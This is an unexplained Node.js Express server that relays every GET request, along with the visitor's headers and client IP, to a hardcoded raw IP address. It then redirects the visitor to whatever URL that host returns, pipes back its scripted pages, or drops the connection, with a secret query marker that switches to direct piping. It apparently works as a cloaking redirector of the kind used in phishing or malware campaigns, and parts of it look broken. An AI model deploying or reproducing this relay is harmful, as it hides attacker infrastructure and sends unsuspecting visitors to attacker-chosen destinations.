var bodyParser = require("body-parser");
var express = require("express");
const requester = require("request");

var app = express();
app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.raw());
app.set("port", process.env.PORT);

app.get("*", function (req, res) {
 try {
        req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
        var head = req.headers;
        var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
        var querystring = req.url;
        var urrrl = "http://185.236.78.147:6070" + req.url;
        console.log(urrrl);
        if(!querystring.includes("flgkimv")){
           
            requester.get(
            {
              headers:JSON.parse(headerss),
              url:     urrrl,
            }, function(error, response, body){
               try {
                    if(response.statusCode==200){
                      console.log(body);
                      if(!body.includes("<")){
                        console.log("sdfsdf");
                        return res.redirect(body); 
                      }else if(body.includes("<body> <script>")){
                        console.log("2");
                        return body.pipe(res);
                      }
                      else{
                        console.log("3");
                        return req.destroy();           
                      }
                    }else{  
                      console.log("4");
                      return req.destroy();
                    }
                } catch (error) {
                 console.log("5");
                 return req.destroy();
              }
          });
          
        }else if(querystring.includes("flgkimv")){
          
          requester.get({headers:JSON.parse(headerss),url:urrrl}).pipe(res);
             
        }else{
         console.log("6");
           return req.destroy();
        }
    } catch (error) {
       console.log("7");
       console.error(error);
       return req.destroy();
    }
});

app.listen(process.env.PORT, "0.0.0.0", function () {
  console.log(app.get("port"));
  console.log("Starting listen...");
});
